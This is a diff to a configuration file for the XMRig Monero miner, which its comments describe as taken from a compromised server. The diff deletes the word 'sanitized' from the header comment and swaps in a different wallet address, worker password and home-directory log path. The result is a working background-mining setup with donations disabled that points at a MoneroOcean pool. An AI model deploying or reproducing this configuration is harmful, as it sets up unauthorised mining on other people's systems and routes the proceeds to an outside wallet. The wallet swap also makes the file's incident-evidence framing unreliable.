@@ -1,7 +1,6 @@
 {
-    "_comment": "SANITIZED FROM REAL INCIDENT — XMRig background configuration",
-    "_comment2": "This config runs the miner in background mode with donate-level=0",
-    "_comment3": "The algo-perf section shows actual benchmark results from the compromised server",
+    "_comment": "FROM REAL INCIDENT — XMRig background configuration (original values preserved)",
+    "_comment2": "The algo-perf section shows actual benchmark results from the compromised server",
     "autosave": true,
     "background": true,
     "cpu": {
@@ -31,14 +30,14 @@
     },
     "opencl": { "enabled": false },
     "cuda": { "enabled": false },
-    "log-file": "/home/svc-deploy/moneroocean/xmrig.log",
+    "log-file": "/home/restudio/moneroocean/xmrig.log",
     "donate-level": 0,
     "donate-over-proxy": 1,
     "pools": [
         {
             "url": "gulf.moneroocean.stream:10032",
-            "user": "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A",
-            "pass": "exercise-worker",
+            "user": "41qbTDmsb6s4RiWgju3kSSNStWYY7mfyoepx4sFmw5um68MxJtnzQQw31bN1Y9hjp4jYwg2WTpeUfaGT375rNvyX4VGNw8Q",
+            "pass": "multivendor",
             "keepalive": true,
             "enabled": true,
             "tls": false,
